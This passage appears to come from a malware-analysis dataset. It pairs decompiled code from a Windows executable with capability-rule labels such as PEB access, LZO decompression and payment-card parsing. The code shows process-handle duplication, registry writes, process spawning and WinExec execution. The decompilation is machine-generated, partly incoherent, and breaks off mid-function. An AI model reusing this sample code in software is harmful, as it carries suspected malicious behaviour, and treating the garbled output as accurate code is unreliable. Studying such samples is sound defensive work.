        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: pvData\n\nbool __cdecl fcn.004028e0(uint arg_8h)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint32_t in_EAX;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    char *unaff_EBX;\n    uint8_t in_AF;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    uint pvData;\n    \n    if ((in_ZF || in_OF != in_SF) || (!in_ZF && in_OF == in_SF)) {\n        iVar5 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n        if (iVar5 != -1) {\n            return false;\n        }\n        return true;\n    }\n    uVar2 = 9 < (in_EAX & 0xf) | in_AF;\n    uVar3 = in_EAX + uVar2 * '\\x06';\n    pcVar4 = in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + uVar2, uVar3) & 0xff0f;\n    if (in_ECX != 0) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *pcVar4 = *pcVar4 + (uVar3 & 0xf);\n    if (unaff_EBX == NULL) {\n        return false;\n    }\n    iVar5 = -1;\n    do {\n        if (iVar5 == 0) break;\n        iVar5 = iVar5 + -1;\n        cVar1 = *unaff_EBX;\n        unaff_EBX = unaff_EBX + 1;\n    } while (cVar1 != '\\0');\n    iVar5 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(2, 0x71d8, 0x7218, 1);\n    return iVar5 == 0;\n}\n",
        "token_count": 453
    },
    "004047c0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004047c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00402120(0x40707c);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    if (iVar1 == -1) {\n        if (iVar1 != -1) {\n            out(0xbd, 0xffffffff);\n            return 0xffffffff;\n        }\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 250
    },
    "00404a90": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b38) overlaps instruction at (ram,0x00404b36)\n// \n// WARNING: Removing unreachable block (ram,0x00404ba6)\n// WARNING: Removing unreachable block (ram,0x00404bae)\n\nvoid __cdecl\nfcn.00404a90(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    char cVar10;\n    char cVar11;\n    ulong uVar12;\n    uint *apuStack48614 [6023];\n    uchar *puStack24519;\n    uint uStack24491;\n    int32_t in_stack_ffffa05d;\n    int32_t in_stack_ffffa061;\n    uint in_stack_ffffa065;\n    int32_t arg_ch_00;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar7 = &stack0xfffffffc;\n    puVar8 = &stack0xfffffffc;\n    if ((*0x10 != 0x110) && (puVar8 = &stack0xfffffffc,  *0x10 == 0x110)) {\n        puVar6 = 0xfffffff0;\n        puVar8 = 0xfffffff0;\n        cVar10 = '\\x10';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar7;\n            cVar10 = cVar10 + -1;\n        } while ('\\0' < cVar10);\n    }\n    iVar1 = puVar8[8];\n    arg_ch_00 = puVar8[7];\n    uVar2 = puVar8[6];\n    fcn.00401f30(uVar2, arg_ch_00, puVar8[2], 0x20, iVar1 + 0x20);\n    fcn.00401f30(uVar2, arg_ch_00, puVar8[3], 0x20, iVar1 + 0x60);\n    cVar11 = '\\0';\n    cVar10 = '\\0';\n    uVar2 = puVar8[6];\n    uVar12 = fcn.00401f30(uVar2, arg_ch_00, puVar8[4], 0x20, iVar1 + 0xa0);\n    iVar4 = uVar12;\n    if ((cVar11 != cVar10) || (iVar5 = extraout_ECX,  cVar11 == cVar10)) {\n        iVar5 = puVar8[5];\n        iVar4 = iVar1 + 0xe0;\n        in_stack_ffffa065 = 0x20;\n        in_stack_ffffa05d = arg_ch_00;\n        in_stack_ffffa061 = iVar5;\n        arg_ch_00 = iVar4;\n    }\n    cVar10 = uVar12 >> 0x28;\n    pcVar3 = uVar12 >> 0x20 & 0xffff0000 | CONCAT11(uVar12 >> 0x20, cVar10);\n    *pcVar3 = *pcVar3 + cVar10;\n    pcVar3[0x6a] = pcVar3[0x6a] + iVar4;\n    *(iVar5 + 0x53) = *(iVar5 + 0x53) & iVar4;\n    uStack24491 = 0x404b4c;\n    fcn.00401f30(uVar2, in_stack_ffffa05d, in_stack_ffffa061, in_stack_ffffa065, arg_ch_00);\n    puVar7 = puVar8;\n    if ((*0x10 != 0x5f7f) && (*0x10 == 0x5f7f)) {\n        puStack24519 = 0xfffffffc;\n        puVar6 = 0xfffffffc;\n        puVar7 = 0xfffffffc;\n        cVar10 = '\\x10';\n        do {\n            puVar8 = puVar8 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar8;\n            cVar10 = cVar10 + -1;\n        } while ('\\0' < cVar10);\n    }\n    apuStack48614[0] = 0x404b63;\n    iVar4 = fcn.00404a40();\n    if (iVar4 == -1) {\n        apuStack48614[0] = 0x404b76;\n        iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(iVar1 + 0x120) = iVar4 % 5;\n    }\n    else {\n        *(iVar1 + 0x120) = iVar4;\n    }\n    *(puVar7 + -0x43) = 0;\n    puVar8 = puVar7 + -0x10b;\n    for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    puVar7[-1] = 0x104;\n    *(puVar8 + 2) = 0;\n    apuStack48614[0] = puVar7 + -1;\n    iVar4 = fcn.00402db0(0x80000001, 0x407258, 0x407284, puVar7 + -2, puVar7 + -0x43);\n    bVar9 = iVar4 != 0;\n    if (bVar9) {\n        puVar8 = puVar7;\n        if ((bVar9) && (!bVar9)) {\n            puVar6 = &stack0xffff421a;\n            puVar8 = &stack0xffff421a;\n            cVar10 = '\\x10';\n            do {\n                puVar7 = puVar7 + -1;\n                puVar6 = puVar6 + -1;\n                *puVar6 = *puVar7;\n                cVar10 = cVar10 + -1;\n            } while ('\\0' < cVar10);\n        }\n        apuStack48614[0] = 0x4072d4;\n        iVar4 = (*_sym.imp.MSVCRT.dll__stricmp)(puVar8 + -0x43);\n        if (iVar4 == 0) {\n            *(iVar1 + 0x120) = *(iVar1 + 0x120) | 0x80;\n        }\n    }\n    return;\n}\n",
        "token_count": 1546
    },
    "00402af0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402cd2) overlaps instruction at (ram,0x00402cd1)\n// \n\nchar * __thiscall fcn.00402af0(int16_t *param_1, int16_t *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint *puVar8;\n    uchar *extraout_ECX;\n    uchar *puVar9;\n    uint32_t uVar10;\n    uint32_t extraout_EDX;\n    uint32_t uVar11;\n    code *unaff_EBX;\n    code *pcVar12;\n    uchar *puVar13;\n    int32_t unaff_ESI;\n    uint32_t uVar14;\n    uint *puVar15;\n    uint *unaff_EDI;\n    uint *puVar16;\n    bool in_CF;\n    bool bVar17;\n    uint8_t in_AF;\n    bool bVar18;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar19;\n    int16_t *piStack00000055;\n    ulong in_stack_00000054;\n    uint8_t uStack24;\n    uchar uStack23;\n    uint16_t uStack22;\n    uint uStack8;\n    char *pcVar7;\n    \n    puVar13 = &stack0xfffffffc;\n    if ((in_CF) || (!in_CF)) {\n        bVar18 = *param_2 == 0x5a4d;\n    }\n    else {\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x8b27e95e;\n        puVar13 = &uStack8 + 3;\n        *(unaff_ESI + -0x7f) = *(unaff_ESI + -0x7f) | in_EAX + 0x7c8ecb0d + (in_CF == false) >> 8;\n        bVar18 = piStack00000055 == param_1;\n        param_2 = param_1;\n    }\n    if (!bVar18) {\n        return NULL;\n    }\n    piVar4 = *(param_2 + 0x1e) + param_2;\n    if (*piVar4 != 0x4550) {\n        return NULL;\n    }\n    if (piVar4[0x16] != 0) {\n        return NULL;\n    }\n    uStack22 = 0;\n    uVar10 = 0x41;\n    uVar3 = piVar4;\n    cVar2 = uVar3 - *0x40;\n    uStack24 = (in_ID & 1) * 0x200000 >> 0x10 | (in_VIP & 1) * 0x100000 >> 0x10 | (in_VIF & 1) * 0x80000 >> 0x10 |\n               (in_AC & 1) * 0x40000 >> 0x10;\n    uStack23 = 0;\n    uStack8 = param_1;\n    func_0x10188b1a((in_NT & 1) * 0x4000 | SBORROW1(uVar3, *0x40) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                    (cVar2 < '\\0') * 0x80 | (cVar2 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                    ((POPCOUNT(cVar2) & 1U) == 0) * 4 | uVar3 < *0x40);\n    bVar18 = SBORROW1(*0x66000000, 'Q');\n    *0x66000000 = *0x66000000 + -0x51;\n    puVar9 = uStack22;\n    if (bVar18 != false) {\n        LOCK();\n    }\n    uVar5 = *(puVar13 + 8);\n    uVar14 = *(uVar5 + 0x3c);\n    bVar18 = SBORROW4(*(uVar5 + 0x3c), 0x80);\n    if (uVar14 < 0x81) {\n        return NULL;\n    }\n    if (bVar18) {\ncode_r0x00402c04:\n        uVar5 = *(uVar5 + 0x3c);\n        if (0xbf < uVar5) goto code_r0x00402c11;\n    }\n    else {\n        uVar11 = extraout_EDX & 0xffff;\n        if (!bVar18) goto code_r0x00402c04;\n        uVar10 = 0x42;\n        *0x41 = in(extraout_EDX);\n        pcVar12 = CONCAT31(unaff_EBX >> 8, 0xbc);\n        if (0x80 < uVar14) goto code_r0x00402c6f;\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*puVar9, 0xbc);\n        uVar5 = 0x3d3c408b;\n        unaff_EBX[3] = unaff_EBX[3] + (extraout_EDX >> 8);\n    }\n    uVar10 = uVar5 - 0x80;\ncode_r0x00402c11:\n    uStack24 = uVar10;\n    uStack23 = uVar10 >> 8;\n    uStack22 = uVar10 >> 0x10;\n    uVar19 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    puVar8 = uVar19;\n    *(puVar13 + -4) = puVar8;\n    if (puVar8 == NULL) {\n        return NULL;\n    }\n    uVar14 = 0;\n    puVar9 = extraout_ECX;\n    pcVar12 = _sym.imp.MSVCRT.dll_rand;\n    uVar5 = uVar10;\n    if (uVar10 != 0) {\n        do {\n            uVar11 = uVar19 >> 0x20;\n            if ((uVar5 < 0) || (uVar5 >= 0)) {\n                uStack24 = 0x76;\n                uStack23 = 0x2c;\n                uStack22 = 0x40;\n                iVar6 = (*pcVar12)();\n                puVar9 = 0xff;\n                uVar11 = iVar6 % 0xff;\n                unaff_EBX = pcVar12;\n                uVar5 = uVar14;\n            }\n            else {\n                uVar5 = uVar19 + 0xe40ce22a;\ncode_r0x00402c6f:\n                *pcVar12 = *pcVar12 & 0xc3;\n                uVar3 = puVar9 & 0x1f;\n                uVar14 = *(puVar9 + 0xffb9);\n                *(puVar9 + 0xffb9) = uVar14 >> uVar3 | uVar14 << 0x21 - uVar3;\n                unaff_EBX = pcVar12 & 0xffff0000 | CONCAT11((pcVar12 >> 8) + (uVar11 >> 8), pcVar12);\n            }\n            puVar8 = *(puVar13 + -4);\n            uVar19 = CONCAT44(uVar11, puVar8);\n            uVar14 = uVar5 + 1;\n            *(uVar5 + puVar8) = uVar11;\n            pcVar12 = unaff_EBX;\n            uVar5 = uVar14 - uVar10;\n        } while (uVar14 < uVar10);\n    }\n    puVar15 = puVar8;\n    puVar16 = *(puVar13 + 8) + 0x80;\n    for (uVar5 = uVar10 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar16 = *puVar15;\n        puVar15 = puVar15 + 1;\n        puVar16 = puVar16 + 1;\n    }\n    bVar18 = false;\n    uVar10 = uVar10 & 3;\n    bVar17 = (POPCOUNT(uVar10) & 1U) == 0;\n    for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n        *puVar16 = *puVar15;\n        puVar15 = puVar15 + 1;\n        puVar16 = puVar16 + 1;\n    }\n    if ((bVar17) || (!bVar17)) {\n        uStack24 = puVar8;\n        uStack23 = puVar8 >> 8;\n        uStack22 = puVar8 >> 0x10;\n        puVar16 = unaff_EDI;\n        func_0x00404f50();\n        bVar18 = 0xfffffffb < &uStack24;\n        puVar8 = 0x1;\n    }\n    puVar8[-6] = puVar8[-6] + 0x78 + bVar18;\n    uVar3 = puVar8 & *puVar8;\n    pcVar7 = puVar8 & 0xffffff00 | uVar3;\n    pcVar1 = ((unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff) + 0x1b804c4;\n    *pcVar1 = *pcVar1 + uVar3;\n    *pcVar7 = *pcVar7 + uVar3;\n    *(puVar16 + 0x5e) = *(puVar16 + 0x5e) + (unaff_EBX & 0xffff);\n    return pcVar7;\n}\n",
        "token_count": 2256
    },
    "00404300": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004044b4) overlaps instruction at (ram,0x004044af)\n// \n// WARNING: Removing unreachable block (ram,0x0040437c)\n// WARNING: Removing unreachable block (ram,0x0040440b)\n// WARNING: Removing unreachable block (ram,0x00404412)\n\nint32_t fcn.00404300(void)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint8_t extraout_CL;\n    uint8_t extraout_CL_00;\n    uint8_t uVar5;\n    code *pcVar6;\n    uint *puVar7;\n    code *pcVar8;\n    uint *puVar9;\n    uchar uVar10;\n    char in_AF;\n    bool bVar11;\n    char cVar12;\n    char cVar13;\n    uint uStack696;\n    code *pcStack692;\n    uint uStack688;\n    uint uStack684;\n    uint uStack680;\n    uint *puStack676;\n    int32_t iStack672;\n    uint uStack668;\n    uint uStack664;\n    uchar *puStack660;\n    uint uStack611;\n    uchar uStack352;\n    uint uStack351;\n    uint uStack24;\n    \n    puVar7 = &stack0xfffffffc;\n    fcn.00401c10();\n    iVar3 = fcn.00403ae0();\n    if (iVar3 != 0) {\n        puVar9 = &stack0xfffffd9d;\n        for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar9 = 0;\n            puVar9 = puVar9 + 1;\n        }\n        *puVar9 = 0;\n        *(puVar9 + 2) = 0;\n        iVar3 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        if (iVar3 != 0) {\n            fcn.00404770();\n            uStack352 = 0;\n            puVar9 = &stack0xfffffea1;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            *puVar9 = 0;\n            iStack672 = puVar9 + 3;\n            *(puVar9 + 2) = 0;\n            puStack660 = &stack0xfffffea0;\n            uStack664 = 0x4043c9;\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            uStack24 = 0;\n            pcVar6 = _sym.imp.USER32.dll_EnumWindows;\n            pcVar8 = _sym.imp.KERNEL32.dll_Sleep;\n            do {\n                puVar9 = puVar7 + -0x16;\n                for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                *(puVar7 + -10) = 0;\n                puVar7[-4] = 0;\n                puVar7[-3] = 0;\n                puVar7[-0x16] = 0x44;\n                puVar7[-2] = 0;\n                puVar7[-0xb] = 1;\n                puVar7[-1] = 0;\n                puStack660 = NULL;\n                uStack664 = 0;\n                uStack668 = 0;\n                iStack672 = 0;\n                puStack676 = puVar7 + -0x57;\n                uStack680 = 0;\n                uStack684 = 0x404436;\n                uVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                bVar11 = uVar4 == 0;\n                uVar10 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n                if (bVar11) {\n                    return 0;\n                }\n                if ((bVar11) || (!bVar11)) {\ncode_r0x00404452:\n                    uStack684 = 3000;\n                    uStack688 = 0x404459;\n                    (*pcVar8)();\n                    uStack688 = puVar7[-2];\n                    pcStack692 = fcn.004041f0;\n                    uStack696 = 0x404464;\n                    (*pcVar6)();\n                    if ((!uVar10) && (uVar10)) {\n                        puVar9 = &stack0xfffffd48;\n                        cVar12 = '\\x1e';\n                        do {\n                            puVar7 = puVar7 + -1;\n                            puVar9 = puVar9 + -1;\n                            *puVar9 = *puVar7;\n                            cVar12 = cVar12 + -1;\n                        } while ('\\0' < cVar12);\n                        iVar3 = in(0x78);\n                        return iVar3;\n                    }\n                    uStack696 = 1000;\n                    iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(puVar7[-4]);\n                    cVar13 = SBORROW4(iVar3, 0x102);\n                    cVar12 = iVar3 + -0x102 < 0;\n                    uVar10 = iVar3 == 0x102;\n                    uVar5 = extraout_CL;\n                    if (uVar10) goto code_r0x00404496;\n                }\n                else {\n                    pcVar6 = pcVar6 + 1;\n                    if (pcVar6 != NULL) {\n                        piVar1 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n                        *piVar1 = *piVar1 - pcVar6;\n                        pcVar8 = pcVar8 + 1;\n                        uVar10 = (POPCOUNT(pcVar8 & 0xff) & 1U) == 0;\n                        goto code_r0x00404452;\n                    }\n                    cVar13 = SCARRY4(puVar7, 1);\n                    puVar7 = puVar7 + 1;\n                    cVar12 = puVar7 < 0;\n                    uVar10 = puVar7 == NULL;\n                    LOCK();\ncode_r0x00404496:\n                    uStack688 = puVar7[-4];\n                    uStack684 = 1;\n                    pcStack692 = 0x4044a2;\n                    iVar3 = (*_sym.imp.KERNEL32.dll_TerminateProcess)();\n                    uVar5 = extraout_CL_00;\n                }\n                pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n                if ((!uVar10 && cVar13 == cVar12) && (uVar10 || cVar13 != cVar12)) {\n                    *(iVar3 + -0x74c625aa) = *(iVar3 + -0x74c625aa) ^ uVar5;\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                uStack684 = puVar7[-3];\n                uStack688 = 0x4044c0;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                uStack688 = puVar7[-4];\n                pcStack692 = 0x4044c6;\n                (*pcVar2)();\n                iVar3 = puVar7[-5] + 1;\n                puVar7[-5] = iVar3;\n            } while (iVar3 < 1);\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1687
    },
    "004032e0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.004032e0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x423638 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00402330(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e4, acStack1304, &uStack2112);\n    uStack2088 = 0x40736c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407384;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404570(auStack1564, 0x4072e0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1867
    },
    "00402db0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e1a) overlaps instruction at (ram,0x00402e19)\n// \n// WARNING: Removing unreachable block (ram,0x00402e1a)\n\nbool fcn.00402db0(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5, uint param_6)\n\n{\n    int32_t iVar1;\n    uint *unaff_EDI;\n    uint uStack8;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(param_1, param_2, 0, 0xf003f, &uStack8);\n    if (iVar1 == 0) {\n        if ((-1 < iVar1) && (-1 >= iVar1)) {\n            out(0xc4, 0);\n            *unaff_EDI = 0;\n        }\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(uStack8, param_3, 0, param_4, param_5, param_6);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack8);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 275
    },
    "004049e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004049e0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.004022a0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x423618;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid entry0(void)\n\n{\n    uint *puVar1;\n    uint argv;\n    uint8_t *puVar2;\n    uint *in_FS_OFFSET;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint lpStartupInfo;\n    uint32_t var_30h;\n    uint var_2ch;\n    uchar *var_18h;\n    uint *var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x4061c0;\n    uStack16 = 0x4050f0;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    var_18h = &stack0xffffff78;\n    var_4h = 0;\n    (*_sym.imp.MSVCRT.dll___set_app_type)(2);\n    *0x423670 = 0xffffffff;\n    *0x423674 = 0xffffffff;\n    puVar1 = (*_sym.imp.MSVCRT.dll___p__fmode)();\n    *puVar1 = *0x42366c;\n    puVar1 = (*_sym.imp.MSVCRT.dll___p__commode)();\n    *puVar1 = *0x423668;\n    *0x423678 = *_sym.imp.MSVCRT.dll__adjust_fdiv;\n    fcn.004050ef();\n    if (*0x423620 == 0) {\n        (*_sym.imp.MSVCRT.dll___setusermatherr)(0x4050ec);\n    }\n    fcn.004050da();\n    sub.MSVCRT.dll__initterm(0x407008, 0x40700c);\n    var_6ch = *0x423664;\n    (*_sym.imp.MSVCRT.dll___getmainargs)(&var_60h, &var_70h, &var_64h, *0x423660, &var_6ch);\n    